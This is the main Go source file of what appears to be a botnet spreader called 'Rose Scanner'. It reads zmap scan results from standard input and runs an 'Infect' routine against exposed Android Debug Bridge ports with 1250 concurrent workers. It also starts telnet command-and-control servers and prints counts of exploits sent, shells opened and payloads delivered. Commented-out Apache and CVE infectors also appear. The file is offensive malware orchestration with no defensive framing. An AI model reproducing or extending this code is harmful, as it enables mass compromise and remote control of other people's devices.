package main

import (
	"bufio"
	"fmt"
	"os"
	"scanner/components/core/exploit/adb"

	"scanner/components/core/telnet"
	"scanner/components/utils"
	"strconv"
	"time"

	"github.com/zenthangplus/goccm"
)

func CheckArgs() int {
	if len(os.Args) < 2 {
		fmt.Println("Usage: zmap -q -p <port> | ./scanner <port>")
		os.Exit(1)
	}

	Port, Err := strconv.Atoi(os.Args[1])
	if Err != nil {
		fmt.Println("Invalid port")
		os.Exit(1)
	}

	fmt.Printf(`
    ~~~~~~~~~~~~~~~
    | Rose Scanner
    | Target: %d
    ~~~~~~~~~~~~~~~
`, Port)

	return Port
}

func Report() {
	for {
		fmt.Printf("[Scanned: %d] [AdbFound: %d] [ExploitSent: %d] [ShellOpened: %d] [Sent: %d]\n", utils.ScannedAddress, utils.AdbFound, utils.ExploitSent, utils.ShellOpened, utils.PayloadSent)
		time.Sleep(1 * time.Second)
	}
}

func main() {
	Port := CheckArgs()

	go telnet.CmdSenderServer()
	go telnet.HandleServer()
	go Report()

	c := goccm.New(1250)
	for {
		Stdin := bufio.NewScanner(bufio.NewReader(os.Stdin))

		for Stdin.Scan() {
			utils.ScannedAddress++
			Text := Stdin.Text()

			c.Wait()
			go func(Addr string) {
				adb.Infect(Addr, Port)
				
				/*apache1.Infect(Text, Port)
				cve.Infect(Text, Port)*/
				c.Done()
			}(Text)
		}
	}
}
